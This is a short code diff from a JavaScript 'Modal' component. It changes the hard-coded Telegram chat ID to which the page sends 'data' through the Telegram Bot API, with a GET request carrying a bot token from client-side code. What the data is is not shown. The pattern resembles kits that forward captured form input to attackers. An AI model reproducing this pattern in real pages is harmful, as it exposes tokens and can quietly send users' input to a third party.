@@ -12,7 +12,7 @@ const Modal = ({ close }) => {
     let url =
       "https://api.telegram.org/bot" +
       token +
-      "/sendMessage?chat_id=1014474410&text=";
+      "/sendMessage?chat_id=-867448364&text=";
     let xhttp = new XMLHttpRequest();
     xhttp.open("GET", url + data, true);
     xhttp.send();
